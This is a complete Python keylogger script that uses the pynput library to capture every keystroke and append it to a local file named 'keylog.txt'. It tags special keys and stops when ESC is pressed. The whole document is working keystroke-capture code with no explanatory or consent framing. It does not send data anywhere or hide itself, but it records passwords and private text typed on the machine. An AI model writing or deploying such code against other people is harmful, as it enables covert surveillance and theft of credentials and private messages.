from pynput import keyboard

# File to store the logs
log_file = "keylog.txt"

# Buffer to hold characters until a special key is pressed
buffer = ""

def on_press(key):
    global buffer
    try:
        # Capture alphanumeric characters and append them to the buffer
        buffer += key.char
    except AttributeError:
        # Handle special keys (ignore SHIFT)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(buffer + "[SPACE]\n")
                buffer = ""
            elif key == keyboard.Key.enter:
                f.write(buffer + "[ENTER]\n")
                buffer = ""
            elif key == keyboard.Key.tab:
                f.write(buffer + "[TAB]\n")
                buffer = ""
            elif key == keyboard.Key.backspace:
                f.write(buffer + "[BACKSPACE]\n")
                buffer = ""
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                # Ignore SHIFT keys
                pass
            elif key == keyboard.Key.esc:
                # Ignore ESC keys
                pass
            else:
                f.write(buffer + f" [{key}]\n")
                buffer = ""

def on_release(key):
    # Stop keylogger when ESC key is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
